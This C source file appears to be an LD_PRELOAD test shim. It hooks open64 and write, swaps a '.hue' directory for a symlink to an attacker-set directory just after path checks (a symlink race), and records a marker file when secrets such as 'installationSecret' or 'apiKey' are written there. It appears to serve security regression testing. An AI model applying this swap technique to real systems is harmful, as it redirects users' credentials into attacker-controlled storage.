#define _GNU_SOURCE
#include <dlfcn.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <unistd.h>

static int (*real_open64)(const char *, int, ...);
static ssize_t (*real_write)(int, const void *, size_t);

static int interesting(const char *path) {
  const char *slash = strrchr(path, '/');
  const char *base = slash == NULL ? path : slash + 1;
  return strstr(base, "installation-") != NULL || strstr(base, "claim-handoff-") != NULL ||
         strstr(base, "application-evidence-") != NULL;
}

/* Swap at open, after any path check in the caller has already returned. */
static void swap_directory(const char *path) {
  const char *mark = strstr(path, "/.hue/");
  const char *attacker = getenv("HUE_ATTACKER_DIR");
  char dir[4096];
  char saved[4096];
  struct stat info;
  size_t length;
  if (mark == NULL || attacker == NULL) return;
  length = (size_t)(mark - path) + strlen("/.hue");
  if (length >= sizeof dir) return;
  memcpy(dir, path, length);
  dir[length] = '\0';
  if (lstat(dir, &info) != 0 || S_ISLNK(info.st_mode)) return;
  if (snprintf(saved, sizeof saved, "%s.victim", dir) >= (int)sizeof saved) return;
  if (rename(dir, saved) != 0) return;
  if (symlink(attacker, dir) != 0) rename(saved, dir);
}

static int in_attacker(int fd) {
  const char *attacker = getenv("HUE_ATTACKER_DIR");
  char link[64];
  char target[4096];
  ssize_t length;
  size_t prefix;
  if (fd < 0 || attacker == NULL) return 0;
  snprintf(link, sizeof link, "/proc/self/fd/%d", fd);
  length = readlink(link, target, sizeof target - 1);
  if (length < 0) return 0;
  target[length] = '\0';
  prefix = strlen(attacker);
  return strncmp(target, attacker, prefix) == 0 &&
         (target[prefix] == '/' || target[prefix] == '\0');
}

static void mark_leak(void) {
  const char *marker = getenv("HUE_LEAK_MARKER");
  int fd;
  if (marker == NULL || real_open64 == NULL || real_write == NULL) return;
  fd = real_open64(marker, O_CREAT | O_WRONLY | O_TRUNC, 0644);
  if (fd < 0) return;
  real_write(fd, "leaked\n", 7);
  close(fd);
}

static void scan(int fd, const char *buffer, size_t length) {
  if (!in_attacker(fd) || buffer == NULL || length == 0) return;
  if (memmem(buffer, length, "installationSecret", 18) != NULL ||
      memmem(buffer, length, "apiKey", 6) != NULL ||
      memmem(buffer, length, "location.replace", 16) != NULL)
    mark_leak();
}

int open64(const char *path, int flags, ...) {
  mode_t mode = 0;
  int fd;
  if (real_open64 == NULL) real_open64 = dlsym(RTLD_NEXT, "open64");
  if (flags & O_CREAT) {
    va_list args;
    va_start(args, flags);
    mode = (mode_t)va_arg(args, int);
    va_end(args);
  }
  if (path != NULL && (flags & O_CREAT) != 0 && interesting(path)) swap_directory(path);
  fd = real_open64(path, flags, mode);
  return fd;
}

ssize_t write(int fd, const void *buffer, size_t count) {
  ssize_t wrote;
  if (real_write == NULL) real_write = dlsym(RTLD_NEXT, "write");
  wrote = real_write(fd, buffer, count);
  if (wrote > 0) scan(fd, buffer, (size_t)wrote);
  return wrote;
}
